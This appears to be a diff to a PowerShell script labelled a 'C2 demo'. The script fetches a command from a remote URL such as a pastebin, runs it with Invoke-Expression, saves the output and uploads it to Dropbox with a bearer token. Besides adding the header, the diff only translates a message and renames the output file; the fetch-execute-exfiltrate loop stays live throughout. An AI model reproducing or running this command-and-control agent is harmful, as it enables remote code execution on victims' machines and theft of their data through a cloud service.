@@ -1,3 +1,8 @@
+####################################################################################################
+#
+# C2 DEMO script
+#
+####################################################################################################
 
 Param(
     [Parameter(Mandatory=$true)]
@@ -7,8 +12,8 @@ Param(
 )
 
 $BASEDIR = pwd
-$cmd = Invoke-webrequest -URI "$cmd_source"
-Write-Host "Test del comando" + $cmd
+$cmd = Invoke-webrequest -URI "$cmd_source" # some raw source (es: pastebin)
+Write-Host "Test command " + $cmd
 
 if ( "$cmd" -eq 'NOP')
 {
@@ -18,10 +23,10 @@ else
 {
     $content = Invoke-Expression $cmd
     Write-Host $content
-    $content | Out-File -FilePath "$BASEDIR\psoutput.txt"
+    $content | Out-File -FilePath "$BASEDIR\gb-output.txt"
 
     # set args
-    $TargetFilePath = '/psoutput.txt'
+    $TargetFilePath = '/gb-output.txt'
     $args = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
     $auth = "Bearer " + $C2GB_token
     $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
@@ -30,5 +35,5 @@ else
     $headers.Add("Content-Type", 'application/octet-stream')
 
     # send file
-    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile .\psoutput.txt -Headers $headers
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile .\gb-output.txt -Headers $headers
 }
